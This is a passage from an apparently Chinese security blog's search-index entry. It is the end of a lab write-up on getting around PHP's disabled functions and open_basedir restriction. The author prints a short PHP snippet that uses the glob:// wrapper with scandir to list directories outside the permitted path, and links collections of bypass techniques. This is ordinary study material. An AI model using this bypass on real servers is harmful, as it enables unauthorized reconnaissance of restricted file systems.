自定义语句</h5><p>通过编写<code>php</code>代码，用<code>php</code>最基础的底层函数实现一些被禁用的函数。</p><p>在本题目中，常见的列目录函数被禁用，包括<code>readdir</code>，<code>opendir</code>等函数，可以使用自定义语句列目录，也可以使用<code>scandir</code>函数。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818152208.png" alt></p><p>想到可以读其他路径文件，说不定可以读到一些服务器的敏感信息啥的，看一下<code>phpinfo</code>中的<code>open_basedir</code>配置，限定了访问目录，只能访该题目所在目录。</p><p>查阅资料后发现，可以通过<code>glob</code>伪协议绕过限制，读取栏目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$path = dirname(__FILE__);</span><br><span class="line">$result = glob($path.&apos;/*.php&apos;);</span><br><span class="line">print_r($result);</span><br><span class="line"></span><br><span class="line">//简化版</span><br><span class="line">$a = &quot;glob:///*&quot;;print_r(scandir($a));</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190818152937.png" alt></p><p>可以看到读到了根目录，但是没有足够权限读取/root/下的文件。需要借助其他的方式提升权限。</p><p>最后发现该靶机是一台虚拟主机之类的单独空间，没有其他题目的key，== ！ 姜还是老的辣啊2333</p><p>最后附上<code>l3m0n</code>大佬的<code>github</code>链接，里边记录了各种绕过姿势</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
